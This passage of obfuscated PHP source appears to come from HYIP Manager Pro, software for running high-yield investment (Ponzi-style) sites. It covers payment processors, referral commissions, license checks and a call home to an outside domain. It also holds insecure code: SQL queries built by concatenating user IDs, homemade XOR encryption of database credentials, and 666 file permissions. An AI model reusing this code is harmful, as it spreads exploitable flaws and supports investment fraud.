      $elnlcxObM = elnlcaplfw ($elnlcxObM, $s[$elnlcEuoJk['elnlcstTp']]);
      $elnlcApTk = split ('
', $elnlcxObM);
      for ($i = $elnlcEuoJk['elnlcTMAG']; $i < sizeof ($elnlcApTk); ++$i)
      {
        list ($elnlcRSiyq, $elnlcqMdD) = split ('	', $elnlcApTk[$i], 2);
        $s[$elnlcRSiyq] = $elnlcqMdD;
      }
    }

    $elnlcCawm = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcEuoJk['elnlcIClH']);
    $s[$elnlcEuoJk['elnlcThKL']] = $elnlcCawm[$s[$elnlcEuoJk['elnlcOECbf']] - 1];
    if ($s[$elnlcEuoJk['elnlcDvrvD']] == 1)
    {
      $s[$elnlcEuoJk['elnlcPwfwL']] = sprintf ('%d', (time () - mktime (0, 0, 0, $s[$elnlcEuoJk['elnlcOECbf']], $s[$elnlcEuoJk['elnlcmRnOQ']], $s[$elnlcEuoJk['elnlccSzVf']])) / 86400);
    }

    $s[$elnlcEuoJk['elnlcEhrol']] = sprintf ('%d', $s[$elnlcEuoJk['elnlcEhrol']]);
    $s[$elnlcEuoJk['elnlcCcLw']] = ($s[$elnlcEuoJk['elnlcEHKOv']] ? 1 : 0);
    $s[$elnlcEuoJk['elnlcTiwe']] = $s[$elnlcEuoJk['elnlcNOFp']];
    return $s;
  }

  function elnlciobim ($a)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    $elnlcRDaq = serialize ($elnlcJutIa);
    $elnlcdBxmN = md5 ($elnlcRDaq);
    $elnlcRuMnj = md5 ($elnlcdBxmN . $elnlcRDaq);
    $elnlcRDaq = $elnlcdBxmN . ':' . $elnlcRuMnj . ':' . $elnlcRDaq;
    $elnlcRDaq .= chr (1) . chr (1) . chr (1);
    $elnlcqhoG = strlen ($elnlcRDaq) + 121;
    $elnlcgoCyD = rand (1, 100000000000) % $elnlcqhoG;
    $elnlcwopR = array ();
    $d = array ();
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < $elnlcqhoG; ++$i)
    {
      $d[$i] = -1;
      $elnlcwopR[$i] = -1;
    }

    $elnlcgoCyD = elnlcapfc (0, $elnlcqhoG, $d);
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < strlen ($elnlcRDaq); ++$i)
    {
      $elnlcgoCyD = elnlcapfc ($elnlcgoCyD, $elnlcqhoG, $d);
      $d[$elnlcgoCyD] = substr ($elnlcRDaq, $i, 1);
    }

    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < $elnlcqhoG; ++$i)
    {
      if ($d[$i] == -1)
      {
        $d[$i] = chr (rand (1, 253));
        continue;
      }
    }

    $elnlcVaaPH = fopen ($elnlcEuoJk['elnlckjuPU'], $elnlcEuoJk['elnlcQFiog']);
    $r = array ();
    fputs ($elnlcVaaPH, '<?
');
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < $elnlcqhoG; ++$i)
    {
      fputs ($elnlcVaaPH, sprintf ('%02x', ord ($d[$i]) ^ 65));
    }

    fputs ($elnlcVaaPH, '
?>');
    fclose ($elnlcVaaPH);
  }

  function elnlcojggb ()
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if (!is_writeable ('settings.php'))
    {
      print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>settings.php</b> file!<br>';
      exit ();
    }

    if (file_exists ('tmpl_c/.htdata'))
    {
      if (!is_writeable ('tmpl_c/.htdata'))
      {
        print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>tmpl_c/.htdata</b> file!<br>';
        exit ();
      }
    }

    $elnlccUKV = $elnlcEuoJk['elnlcTMAG'];
    if (file_exists ('tmpl_c/.htdata'))
    {
      $elnlccUKV = $elnlcEuoJk['elnlcRMbnT'];
    }

    $elnlcVaaPH = fopen ($elnlcEuoJk['elnlciUWc'], $elnlcEuoJk['elnlcQFiog']);
    reset ($elnlcJutIa);
    fputs ($elnlcVaaPH, '<?/*
');
    $elnlcSthCC = '';
    while (list ($elnlcRSiyq, $elnlcqMdD) = each ($elnlcJutIa))
    {
      if ($elnlcRSiyq != 'logged')
      {
        if (($elnlccUKV == 0 OR ($elnlccUKV == 1 AND preg_match ('/^key/', $elnlcRSiyq))))
        {
          if (!preg_match ('/_generated/', $elnlcRSiyq))
          {
            fputs ($elnlcVaaPH, (('' . $elnlcRSiyq . '	') . $elnlcqMdD . '
'));
            $elnlcSthCC .= (('' . $elnlcRSiyq . '	') . $elnlcqMdD . '
');
          }
        }

        $elnlcSthCC .= (('' . $elnlcRSiyq . '	') . $elnlcqMdD . '
');
        continue;
      }
    }

    $elnlcSthCC = elnlckkgc ($elnlcSthCC, $elnlcJutIa[$elnlcEuoJk['elnlcstTp']]);
    $elnlcHnHc = $elnlcEuoJk['elnlcTMAG'];
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < strlen ($elnlcSthCC); $i += 5)
    {
      $elnlcHnHc += hexdec (substr ($elnlcSthCC, $i, 5));
    }

    $elnlcHnHc = $elnlcHnHc * 15;
    fputs ($elnlcVaaPH, ('' . 'cnf	' . $elnlcHnHc . '
'));
    fputs ($elnlcVaaPH, '*/?>
');
    fclose ($elnlcVaaPH);
    if ($elnlccUKV == 1)
    {
      $elnlcVaaPH = fopen ($elnlcEuoJk['elnlcRUuOk'], $elnlcEuoJk['elnlcQFiog']);
      fputs ($elnlcVaaPH, $elnlcSthCC);
      fclose ($elnlcVaaPH);
    }

  }

  function elnlcseks ($q, $w, $a)
  {
    global $elnlcEuoJk;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlckkgc ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcEuoJk['elnlcTMAG'];
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlctuin ($q, $w, $a)
  {
    global $elnlcEuoJk;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcaplfw ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcEuoJk['elnlcTMAG'];
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlckkgc ($q, $w)
  {
    global $elnlcEuoJk;
    $l = strtoupper (md5 ($w));
    $j = $elnlcEuoJk['elnlcTMAG'];
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcaplfw ($q, $w)
  {
    global $elnlcEuoJk;
    $l = strtoupper (md5 ($w));
    $j = $elnlcEuoJk['elnlcTMAG'];
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcblhg ()
  {
    global $elnlcEuoJk;
    if (!($elnlcaGdf = mysql_connect ($elnlcJutIa[$elnlcEuoJk['elnlcGStlc']], $elnlcJutIa[$elnlcEuoJk['elnlcqfTB']], $elnlcJutIa[$elnlcEuoJk['elnlcyKIL']])))
    {
      exit (mysql_error ());
      (bool)true;
    }

    if (!mysql_select_db ($elnlcJutIa[$elnlcEuoJk['elnlcqqUd']]))
    {
      print mysql_error ();
      exit ();
    }

    return $elnlcaGdf;
  }

  function elnlccfhi ($elnlcqtky = 0)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    $l = elnlctuin ($elnlcJutIa[$elnlcEuoJk['elnlcqfTB']], $elnlcJutIa[$elnlcEuoJk['elnlcstTp']], $elnlcEuoJk['elnlcdmCFO']);
    $p = elnlctuin ($elnlcJutIa[$elnlcEuoJk['elnlcyKIL']], $elnlcJutIa[$elnlcEuoJk['elnlcstTp']], $elnlcEuoJk['elnlcdmCFO']);
    $elnlcFMMEb = elnlctuin ($elnlcJutIa[$elnlcEuoJk['elnlcqqUd']], $elnlcJutIa[$elnlcEuoJk['elnlcstTp']], $elnlcEuoJk['elnlcdmCFO']);
    if ($elnlcqtky == 1)
    {
      $elnlcaGdf = @mysql_connect ($elnlcJutIa[$elnlcEuoJk['elnlcGStlc']], $l, $p);
      if ($elnlcaGdf)
      {
        if (!mysql_select_db ($elnlcFMMEb))
        {
          $elnlcaGdf = $elnlcEuoJk['elnlcTMAG'];
        }
      }
    }
    else
    {
      if (!($elnlcaGdf = mysql_connect ($elnlcJutIa[$elnlcEuoJk['elnlcGStlc']], $l, $p)))
      {
        exit (mysql_error ());
        (bool)true;
      }

      if (!mysql_select_db ($elnlcFMMEb))
      {
        print mysql_error ();
        exit ();
      }
    }

    return $elnlcaGdf;
  }

  function elnlcgqwf ($elnlcaGdf)
  {
    global $elnlcEuoJk;
    mysql_close ($elnlcaGdf);
  }

  function zelnlcmzdkr ($elnlcQISwH)
  {
    global $elnlcEuoJk;
    $elnlcQISwH = htmlspecialchars ($elnlcQISwH, ENT_QUOTES);
    $elnlcQISwH = str_replace ('\\', '\\\\', $elnlcQISwH);
    $elnlcQISwH = str_replace ('\'', '\\\'', $elnlcQISwH);
    return $elnlcQISwH;
  }

  function elnlcmzdkr ($elnlcQISwH)
  {
    $elnlcQISwH = str_replace ('\'', '\'\'', $elnlcQISwH);
    $elnlcQISwH = str_replace ('\\', '\\\\', $elnlcQISwH);
    return $elnlcQISwH;
  }

  function elnlchlqep ($elnlcwIBy, $elnlcnNJP = 1)
  {
    global $elnlcEuoJk;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', $elnlcEuoJk['elnlccncoG']);
    if ($elnlcnNJP == 2)
    {
      $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', $elnlcEuoJk['elnlcbweif']);
    }

    $i = $elnlcEuoJk['elnlcTMAG'];
    $elnlcQISwH = '';
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < $elnlcwIBy; ++$i)
    {
      $elnlcQISwH .= $a[rand (0, sizeof ($a) - 1)];
    }

    if ($elnlcnNJP == 1)
    {
      $elnlcQISwH = md5 ($elnlcQISwH);
    }

    return $elnlcQISwH;
  }

  function elnlcwhkul ($elnlcwIBy)
  {
    global $elnlcEuoJk;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'A', 'B', 'C', 'D', 'E', 'F');
    $i = $elnlcEuoJk['elnlcTMAG'];
    $elnlcQISwH = '';
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < $elnlcwIBy; ++$i)
    {
      $elnlcQISwH .= $a[rand (0, sizeof ($a) - 1)];
    }

    return $elnlcQISwH;
  }

  function elnlcathq ($elnlcqaibS)
  {
    global $elnlcEuoJk;
    $q = '' . 'select type, sum(actual_amount) as sum from hm2_history where user_id = ' . $elnlcqaibS . ' group by type';
    ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
    $elnlcFHGc = array ();
    while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
    {
      $elnlcFHGc[$elnlcTnMjL[$elnlcEuoJk['elnlcEcCfW']]] = $elnlcTnMjL[$elnlcEuoJk['elnlcrlCr']];
    }

    $elnlcgzyx = $elnlcEuoJk['elnlcTMAG'];
    while (list ($elnlcRSiyq, $elnlcqMdD) = each ($elnlcFHGc))
    {
      $elnlcgzyx += $elnlcqMdD;
    }

    $elnlcFHGc[$elnlcEuoJk['elnlcPMIny']] = $elnlcgzyx;
    $q = '' . 'select sum(actual_amount) as sum from hm2_deposits where user_id = ' . $elnlcqaibS . ' and status=\'on\'';
    ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
    while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
    {
      $elnlcFHGc[$elnlcEuoJk['elnlcmFKO']] += $elnlcTnMjL[$elnlcEuoJk['elnlcrlCr']];
    }

    return $elnlcFHGc;
  }

  function elnlcdsheo ($elnlceLxd, $elnlcpvgNp = false)
  {
    global $elnlcEuoJk;
    $elnlcyFVNh = '';
    if ((is_string ($elnlceLxd) AND $elnlceLxd !== ''))
    {
      $elnlcwwey = intval ($elnlceLxd);
      if (strval ($elnlcwwey) === $elnlceLxd)
      {
        $elnlceLxd = $elnlcwwey;
      }
      else
      {
        $elnlcCaTGb = floatval ($elnlceLxd);
        if (strval ($elnlcCaTGb) === $elnlceLxd)
        {
          $elnlceLxd = $elnlcCaTGb;
        }
      }
    }

    if (is_array ($elnlceLxd))
    {
      reset ($elnlceLxd);
      $elnlctCST = true;
      $i = $elnlcEuoJk['elnlcTMAG'];
      foreach ($elnlceLxd as $elnlcjgHVx => $elnlcoMBMg)
      {
        if ((!is_int ($elnlcjgHVx) OR $elnlcjgHVx != $i))
        {
          $elnlctCST = false;
          break;
        }

        ++$i;
      }

      $elnlcDksS = ($elnlctCST ? '[' : '{');
      $elnlcyFVNh .= $elnlcDksS;
      $elnlchpdI = true;
      reset ($elnlceLxd);
      foreach ($elnlceLxd as $elnlcjgHVx => $elnlcoMBMg)
      {
        if (!$elnlchpdI)
        {
          $elnlcyFVNh .= ',';
        }

        if (!$elnlctCST)
        {
          $elnlcyFVNh .= $elnlcjgHVx . ':';
        }

        $elnlcyFVNh .= elnlcdsheo ($elnlcoMBMg, $elnlcpvgNp);
        $elnlchpdI = false;
      }

      $elnlcDksS = ($elnlctCST ? ']' : '}');
      $elnlcyFVNh .= $elnlcDksS;
    }
    else
    {
      if (is_string ($elnlceLxd))
      {
        $elnlcNDaw = array ('\\', '\'', '
', '
');
        $elnlcCCpWC = array ('\\\\', '\\\'', '\\n', '\\r');
        if ($elnlcpvgNp)
        {
          $elnlcNDaw[] = '<';
          $elnlcCCpWC[] = '<\'+\'';
        }

        $elnlcDWur = str_replace ($elnlcNDaw, $elnlcCCpWC, $elnlceLxd);
        $elnlcDksS = '\'' . $elnlcDWur . '\'';
        $elnlcyFVNh .= $elnlcDksS;
      }
      else
      {
        if (is_bool ($elnlceLxd))
        {
          $elnlcDksS = ($elnlceLxd ? 'true' : $elnlcEuoJk['elnlctUyq']);
          $elnlcyFVNh .= $elnlcDksS;
        }
        else
        {
          if (is_null ($elnlceLxd))
          {
            $elnlcDksS = 'null';
            $elnlcyFVNh .= $elnlcDksS;
          }
          else
          {
            $elnlcDksS = $elnlceLxd;
            $elnlcyFVNh .= $elnlcDksS;
          }
        }
      }
    }

    return $elnlcyFVNh;
  }

  function elnlchnfls ($elnlcBQQjF)
  {
    global $elnlcEuoJk;
    $elnlcyFVNh = '';
    foreach ($elnlcBQQjF as $elnlcjgHVx => $elnlctlFRC)
    {
      if ($elnlcyFVNh !== '')
      {
        $elnlcyFVNh .= ', ';
      }

      if (substr ($elnlctlFRC, 0, 5) == 'now()')
      {
        $elnlcyFVNh .= '' . $elnlcjgHVx . ' = ' . $elnlctlFRC;
        continue;
      }
      else
      {
        $elnlcyFVNh .= '' . $elnlcjgHVx . ' = \'' . elnlcmzdkr ($elnlctlFRC) . '\'';
        continue;
      }
    }

    if ($elnlcyFVNh != '')
    {
      $elnlcyFVNh = ' ' . $elnlcyFVNh . ' ';
    }

    return $elnlcyFVNh;
  }

  function elnlccjcld ($elnlcqMdD)
  {
    global $elnlcEuoJk;
    if ($elnlcuNRB == ini_get ('magic_quotes_gpc'))
    {
      $elnlcqMdD = str_replace ('\\\'', '\'', $elnlcqMdD);
      $elnlcqMdD = str_replace ('\\"', '"', $elnlcqMdD);
      $elnlcqMdD = str_replace ('\\\\', '\\', $elnlcqMdD);
    }

    $elnlcqMdD = strip_tags ($elnlcqMdD);
    $elnlcqMdD = trim ($elnlcqMdD);
    return $elnlcqMdD;
  }

  function elnlcskmjl ($i, $j)
  {
    return sprintf ('%.6f', $i);
  }

  function elnlcpjobf (&$elnlcxkmFq, $elnlcHIBq = 0)
  {
    global $elnlcEuoJk;
    reset ($elnlcxkmFq);
    foreach ($elnlcxkmFq as $k => $v)
    {
      $elnlckrsB = array ();
      if (is_array ($v))
      {
        elnlcpjobf ($elnlcxkmFq[$k], $elnlcHIBq);
        continue;
      }
      else
      {
        $elnlckrsB = elnlcbaoq ($v);
        $elnlcxkmFq[$k] = $elnlckrsB[$elnlcHIBq];
        continue;
      }
    }

  }

  function elnlcbaoq ($elnlcqMdD)
  {
    global $elnlcEuoJk;
    global $elnlcyhTO;
    if ($elnlcyhTO == 1)
    {
      $elnlcqMdD = str_replace ('\\\'', '\'', $elnlcqMdD);
      $elnlcqMdD = str_replace ('\\"', '"', $elnlcqMdD);
      $elnlcqMdD = str_replace ('\\\\', '\\', $elnlcqMdD);
    }

    $elnlclKtNg = $elnlcqMdD;
    $elnlcqMdD = strip_tags ($elnlcqMdD);
    $elnlcqMdD = trim ($elnlcqMdD);
    return array ($elnlcqMdD, $elnlclKtNg);
  }

  $elnlcEuoJk = array ('elnlciheCL' => 'payer', 'elnlcEcCfW' => 'type', 'elnlcNOFp' => 'def_payee_account', 'elnlciThax' => 'metal', 'elnlckjuPU' => 'settings.php', 'elnlcImgM' => 'pecunix_from_account', 'elnlccncoG' => 'z', 'elnlcqzxc' => 'pay_active_referal', 'elnlcNwdyU' => '__debug_out', 'elnlcUEQok' => '3m', 'elnlcaDcW' => 'email', 'elnlcxRyf' => 'use_active_referal', 'elnlcmATS' => '12', 'elnlcbzOmi' => 'libertyreserve_apiname', 'elnlcGStlc' => 'hostname', 'elnlcVufnu' => 'error', 'elnlcCetHx' => 'solid_referral_commission_amount', 'elnlcIGEdL' => 'mails.txt', 'elnlcoBFmM' => 'settings.php', 'elnlcodAMu' => 'cnf', 'elnlcseoBI' => 'HTTP_REFERER', 'elnlcMzIM' => 'USD', 'elnlcgzvh' => 'dec_stormpay_fee', 'elnlcnQNDu' => 'install', 'elnlcIINzb' => 'compound', 'elnlcrTVQE' => 'hyip manager pro 2005 jul 26', 'elnlcCcLw' => 'def_payee_account_wiretransfer', 'elnlcRUuOk' => './tmpl_c/.htdata', 'elnlcxczgW' => 'ref_sum', 'elnlcSMxzi' => 'PAYMENT_BATCH_NUM', 'elnlcLSWW' => 'SG8JH9DVX8952VQEZH9F', 'elnlcziJV' => 'KC3STYBTCATZNRVBYGDF', 'elnlcuvEuB' => 'HX8DJ7B9SH5JQN5FXK45', 'elnlcJluTS' => 'use_referal_program', 'elnlcGJRR' => 'actual_amount', 'elnlcdxfPy' => 'http://www.dnsargentina.com.ar/check.cgi?install=1&script=3&domain=', 'elnlctUyq' => 'false', 'elnlcQFob' => 'min_deposit', 'elnlcMhIea' => 'return_profit', 'elnlcAQgnt' => 'deposit_date', 'elnlcqEBK' => 'VPKLNMKMRG27HN95BEHP', 'elnlcdcyey' => '3WBUUNQMPU2LB99GJHUV', 'elnlcbLckW' => 'program_version', 'elnlcgaCLj' => 'eb_metal', 'elnlcOfGcu' => '18', 'elnlciwGl' => 'id', 'elnlcWfVdb' => 'rpcp', 'elnlchMMmI' => 'amnt', 'elnlcmdWAP' => 'magic_quotes_gpc', 'elnlcMdla' => 'free', 'elnlcUPGAL' => 'code', 'elnlceHpQ' => 'EUR', 'elnlcBtPWv' => '/get_sha256.php', 'elnlcGmHP' => '2', 'elnlccJIH' => 'PAYER_ACCOUNT', 'elnlcnJrj' => 'use_solid_referral_commission', 'elnlcrlCr' => 'sum', 'elnlcIClH' => 'Dec', 'elnlcffPD' => 'ok', 'elnlcBCIO' => 'oz', 'elnlckuSA' => 'tw', 'elnlcOBEJR' => 'ok', 'elnlcwqda' => '5M74FW4DADMF7K7MJ5TG', 'elnlcGPoCs' => 'batch', 'elnlcDtUE' => 'balance', 'elnlcgtOE' => 'paypal_currency', 'elnlcGCKC' => 'http://', 'elnlcstTp' => 'key', 'elnlcQysk' => 'html', 'elnlchnjE' => 'evowallet_apiname', 'elnlcHbSx' => 'SCRIPT_NAME', 'elnlcyVlN' => '9999', 'elnlcoBva' => 'withdraw', 'elnlcaOUw' => 'daily_referral_percent_min_user_deposit', 'elnlccJgEp' => 'value', 'elnlclFNy' => 'PAYEE_ACCOUNT', 'elnlchcMw' => 'send_profit_to_stocks', 'elnlcQWmx' => 'w', 'elnlcnnTqn' => 'site_url', 'elnlcGCLH' => 'PAYMENT_AMOUNT', 'elnlcPMIny' => 'total', 'elnlcjjnEf' => 'userid', 'elnlcQOvn' => 'withdrawal_fee_min', 'elnlcQvoI' => 'https://api.alertpay.com/svc/api.svc/sendmoney', 'elnlcoNrc' => 'use_crontab', 'elnlcNscLk' => 'h', 'elnlczsOQ' => 'ebullion_keyID', 'elnlcRMbnT' => '1', 'elnlcmxIcA' => '2XACR4UBJ7DLCV42EM2S', 'elnlcJfzg' => 'finnish', 'elnlcgGyV' => 'y', 'elnlcVJgiM' => 'compound_percents_type', 'elnlcdmCFO' => 'hyip manager pro 2005 jul 27', 'elnlcJEVGv' => 'def_payee_account_ebullion', 'elnlcByWGm' => 'auto', 'elnlcfPsp' => 'egold_paymentunits', 'elnlcEBjT' => 'YmdHis', 'elnlcSmBN' => 'use_ip_for_auto', 'elnlcIPgC' => 'min', 'elnlcRHgv' => 'alertpay_from_account', 'elnlcFqqv' => 'stop_withdraw_percent', 'elnlcqPkWP' => 'HTTP_HOST', 'elnlcmFKO' => 'active_deposit', 'elnlcThKL' => 'site_start_month_str_generated', 'elnlcofjM' => 'DATE', 'elnlckrmT' => 'last_pay_date', 'elnlcbCKSF' => 'deposit_fee_min', 'elnlcoaQSz' => 'currency_sign', 'elnlcvepEe' => 'liberty_currency', 'elnlcSjLJJ' => 'banner_extension', 'elnlcyPRrP' => 'V2_HASH', 'elnlcowcVK' => 'accounts', 'elnlcjKtBk' => '9C64PVXYBZKZHUTMSM2U', 'elnlczwcF' => 'text', 'elnlcstvTo' => 'fee', 'elnlcNuVx' => 'admin_auto_pay_earning', 'elnlcwNFK' => 'q_days', 'elnlceDTDA' => 'delay', 'elnlctrfwD' => '/log_possible_attack.php', 'elnlcHaanG' => 'evowallet_from_account', 'elnlcWsvHa' => '2m', 'elnlchlTW' => 'ENV', 'elnlcBcUUV' => 'md5altphrase_ebullion', 'elnlcVapCl' => 'use_auto_payment', 'elnlcgRBBC' => 'use_compound', 'elnlcJknC' => 'euro', 'elnlckgRG' => 'end', 'elnlcwHGzB' => 'perfectmoney_payer_account', 'elnlcrOxym' => 'cnt', 'elnlcggiN' => '4ZQQN55VA2NXBVFUQJE6', 'elnlctPpS' => 'max', 'elnlcmTPg' => 'came_from', 'elnlccMRVc' => 'PHP_SELF', 'elnlcArPqi' => 'plan', 'elnlcTMkRN' => 'PAYMENT_ID', 'elnlcmoQEQ' => 'VNB34FXT6BJCYD93VXSD', 'elnlcTMAG' => '0', 'elnlcAMrP' => 'payee', 'elnlcznBTd' => 'system_email', 'elnlcQFiog' => 'w', 'elnlcjqvEK' => 'AKKD47LYX8H96K2TM2FQ', 'elnlchKil' => 'withdraw_principal_duration', 'elnlcwTHAT' => 'send_percent_to_stocks', 'elnlchPboH' => 'ZQ54Q9RUQ46CU9C8Z986', 'elnlcskrq' => './tmpl_c/.htdata', 'elnlcjNpMa' => 'ref_username', 'elnlcPwfwL' => 'site_days_online_generated', 'elnlcMOxFJ' => 'amount', 'elnlcQGro' => 'pid', 'elnlccSzVf' => 'site_start_year', 'elnlcVAqsQ' => 'compound_percents', 'elnlcJjdjd' => 'eeecurrency_from_account', 'elnlcwHAAI' => 'exchange', 'elnlcuafl' => 'compound_max_deposit', 'elnlcjhpli' => 'a', 'elnlcHjfwu' => 'user_auto_pay_earning', 'elnlczBIx' => 'd', 'elnlcFFLyb' => 'ref1_cms_minamount', 'elnlcRefSg' => 'ref_name', 'elnlcTiwe' => 'def_payee_account_egold', 'elnlclUck' => 'egold_withdraw_string', 'elnlcVNog' => 'FRM', 'elnlcmOpF' => 'WMHKFJPMT3CZ3RTLPBFL', 'elnlcwvxw' => 'plans_closed', 'elnlcCegwQ' => 'status', 'elnlcvAdf' => './tmpl_c/raw_log', 'elnlcjqTlq' => 'additionalinfo', 'elnlcozQA' => 'return_profit_percent', 'elnlcIPjrO' => 'TIMESTAMPGMT', 'elnlcSLofV' => 'dll', 'elnlceajF' => 'USD', 'elnlcpzHPR' => 'parent', 'elnlciUWc' => './settings.php', 'elnlcPDiIw' => 'daily_referral_percent_min_downline_deposit', 'elnlcnQeB' => 'additional', 'elnlcQTmA' => '6m', 'elnlcIwSM' => 'max_amount', 'elnlcOFmjN' => 'enable_eb_gold', 'elnlcgCmxF' => 'error', 'elnlcCWswy' => 'Deposit returned to user account', 'elnlcAAKd' => 'max_deposit', 'elnlcOECbf' => 'site_start_month', 'elnlcOWTPp' => 'LREUR', 'elnlcVqds' => 'amt', 'elnlcVcpH' => 'evocash_from_account', 'elnlcdUHK' => 'REFERENCENUMBER', 'elnlcNUQQL' => 'site_name', 'elnlcEhrol' => 'time_dif', 'elnlcWsxK' => 'PAYMENT_UNITS', 'elnlcmRnOQ' => 'site_start_day', 'elnlcoBmV' => 'daily_referral_percent', 'elnlciDhmr' => 'td', 'elnlclAVxq' => 'ok11', 'elnlcedqT' => 'HTTP_CACHE_CONTROL', 'elnlcLDayi' => 'md5altphrase_perfectmoney', 'elnlcaWrN' => 'compound_min_deposit', 'elnlcmhGF' => 'dw', 'elnlcqfTB' => 'db_login', 'elnlcrcfF' => 'dec_stormpay_fee2', 'elnlcicuKE' => 'percent', 'elnlckmao' => 'use_html', 'elnlckvtm' => 'def_payee_account_ebullion_gold', 'elnlcItNK' => 'vmoney_from_account', 'elnlcgJuc' => 'wp_ok', 'elnlcJoei' => 'compound_min_percent', 'elnlcqhlS' => 'upline', 'elnlcFQCWA' => '85', 'elnlculqdc' => '501', 'elnlcJDLb' => 'egold_from_account', 'elnlcjnGN' => 'account', 'elnlctGHCB' => '/get_pid.php', 'elnlcrmIN' => 'altergold_from_account', 'elnlcqVdNJ' => 'imps_cost', 'elnlccuNQr' => 'user_id', 'elnlcazft' => 'UYKD37X8YLS5DNFFHL8R', 'elnlcxDSIx' => 'username', 'elnlcEHKOv' => 'enable_wire', 'elnlcFtnn' => 'ec', 'elnlcDvrvD' => 'show_info_box_running_days', 'elnlcbiVt' => 'col', 'elnlcrFBl' => '__debug_data', 'elnlcrDSfN' => '21', 'elnlckwkLS' => 'def_payee_account_ebullion_currency', 'elnlcHuQp' => 'libertyreserve_from_account', 'elnlcNxbm' => 'abcdef', 'elnlcWkrr' => 'currency', 'elnlcvbav' => 'compound_max_percent', 'elnlcifAJl' => 'a', 'elnlcSTmPS' => 'receiving_batch', 'elnlcgLqW' => 'r', 'elnlcEFdo' => 'checksum', 'elnlcRtgL' => 'www.dnsargentina.com.ar', 'elnlcBdjSp' => 'maxam', 'elnlcPNKE' => 'withdraw_principal', 'elnlcyKIL' => 'db_pass', 'elnlcxIrd' => 'B29S2LWPZ5M2KMPPYWKL', 'elnlcdkCHz' => 'N75GNXM2XSM34YMFPED9', 'elnlcviOgh' => 'N55HSU8NJSEU32DP8JDV', 'elnlcGgpLp' => 'enable_eb_ecurrency', 'elnlcfJmw' => 'withdrawal_fee', 'elnlcrBFLn' => 'remitfund_apiname', 'elnlccPDcy' => 'HTTP_X_REAL_IP', 'elnlcKETl' => 'intgold_from_account', 'elnlcWuAFh' => 'Success', 'elnlccyAw' => 'deposit_fee', 'elnlcEOWon' => 'memo', 'elnlcBVfc' => 'v', 'elnlcufLAB' => 'ounce', 'elnlcbweif' => '0', 'elnlcGQve' => 'REMOTE_ADDR', 'elnlcaIae' => 'DESCRIPTION', 'elnlclJLHA' => 'type_id', 'elnlcPFER' => 'hyipid', 'elnlcbcRoQ' => 'checkpayment', 'elnlctKdcx' => 'm', 'elnlcMfpVi' => 'evocash_username', 'elnlcNmcJk' => 'ZXMCQ227FNN5EPHWYHAY', 'elnlciIhdT' => 'period', 'elnlcNflT' => 'pay_withdraw', 'elnlcJzIQ' => 'ref', 'elnlcktNwj' => 'paying_batch', 'elnlckGLe' => 'euro', 'elnlctNAD' => 'LRUSD', 'elnlctSDHf' => '1007', 'elnlcqqUd' => 'database', 'elnlcfnsPF' => 'ac', 'elnlccHJtH' => 'remitfund_from_account', 'elnlcBVhT' => 'license', 'elnlcrcLpV' => 'gpg_path', 'elnlcPaCL' => 'unit', 'elnlcWhGEq' => 'work_week', 'elnlcjRJom' => 'subject', 'elnlcusGx' => 'ref_percent1', 'elnlccCJm' => '15', 'elnlcGQPwC' => 'perfectmoney_from_account', 'elnlcIMJy' => 'proxy.shr.secureserver.net:3128', 'elnlctegj' => 'name', 'elnlcctILW' => 'demomode', 'elnlcqgTz' => 'RETURNCODE');
  ini_set ('magic_quotes_runtime', false);
  define ('LAST_UPDATE_ID', 18);
  global $elnlcCFLE;
  if (!extension_loaded ('gd'))
  {
    $elnlcvTlD = (PHP_SHLIB_SUFFIX == $elnlcEuoJk['elnlcSLofV'] ? 'php_' : '');
